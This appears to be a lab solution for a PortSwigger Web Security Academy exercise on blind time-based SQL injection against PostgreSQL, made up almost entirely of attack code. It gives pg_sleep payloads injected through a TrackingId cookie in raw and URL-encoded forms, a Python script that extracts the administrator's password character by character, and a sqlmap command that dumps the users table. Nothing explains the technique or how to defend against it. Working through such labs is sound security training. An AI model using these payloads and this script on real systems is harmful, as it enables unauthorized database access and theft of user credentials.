___

```sql
x'||PG_SLEEP(10)--
```

```sql
x';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```
url encode

```sql
x'%3bSELECT+CASE+WHEN+(1%3d1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

```sql
x';SELECT CASE WHEN(username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

```sql
x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

```python
import requests
import time
import urllib.parse

# Set the target URL and session cookie
url = 'https://0a91006c04ef245b8033cc45008d0022.web-security-academy.net/'
cookie = {'TrackingId': '', 'session': 'iTq8m3sqiCVktqd3aw0yB3M2CqbTEbbV'}
characters = 'abcdefghijklmnopqrstuvwxyz0123456789'
sleep_time = 10  # Time to sleep for true condition in SQL injection

def check_sqli(payload):
    encoded_payload = urllib.parse.quote(payload)
    cookie['TrackingId'] = encoded_payload
    start_time = time.time()
    response = requests.get(url, cookies=cookie)
    elapsed_time = time.time() - start_time
    return elapsed_time >= sleep_time

def exploit_sqli():
    password = ''
    for i in range(1, 21):  # Assuming password length is between 1 and 20
        found_char = False
        for char in characters:
            payload = f"x';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,{i},1)='{char}') THEN pg_sleep({sleep_time}) ELSE pg_sleep(0) END FROM users--"
            if check_sqli(payload):
                password += char
                print(f"Found character at position {i}: {char}")
                found_char = True
                break
        
        if not found_char:
            print(f"Failed to find character at position {i}. Exiting...")
            break

    return password

if __name__ == '__main__':
    password = exploit_sqli()
    if password:
        print(f"The password for the administrator user is: {password}")
    else:
        print("Failed to extract the password.")
```


## sqlmap

```bash
sqlmap -u 'https://0a39000504f639a681756b95000e00cb.web-security-academy.net/' --cookie="TrackingId=1; session=iTq8m3sqiCVktqd3aw0yB3M2CqbTEbbV" --time-sec=10 --level=5 --risk=3 --batch --dbms=PostgreSQL --technique=T -p TrackingId --dump -T users -C username,password
```
